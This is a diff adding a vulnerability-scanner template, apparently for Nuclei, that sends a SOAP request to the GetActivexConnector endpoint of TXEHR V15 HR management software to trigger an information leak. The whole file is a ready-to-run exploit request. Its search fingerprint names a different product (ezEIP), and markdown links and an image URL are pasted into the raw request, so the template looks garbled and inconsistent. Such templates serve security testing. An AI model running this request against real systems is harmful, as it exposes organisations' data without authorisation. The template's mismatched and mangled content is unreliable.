@@ -1,0 +1,19 @@
+id: poc-tv0qn7cuui5z2sgr
+info:
+  name: 同享TXEHR V15人力管理管理平台GetActivexConnector信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tv0qn7cuui5z2sgr'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tv0qn7cuui5z2sgr
+    fofa: app="万户网络-ezEIP"
+http:
+- raw:
+  - "POST /Service/ActiveXConnector.asmx HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: [https://fofa.info/](https://fofa.info/)\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: ASP.NET_SessionId=f40br0ilcoosnxgllqrmltkd\nUpgrade-Insecure-Requests: 1\nPriority: u=1\nSOAPAction: [http://tempuri.org/GetActivexConnector](http://tempuri.org/GetActivexConnector)\nContent-Type: text/xml;charset=UTF-8\nContent-Length: 224\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:GetActivexConnector/>\n   </soapenv:Body>\n</soapenv:Envelope>![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1729347146004-aed5fc39-8895-40b5-a574-6c52f61bbf0c.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
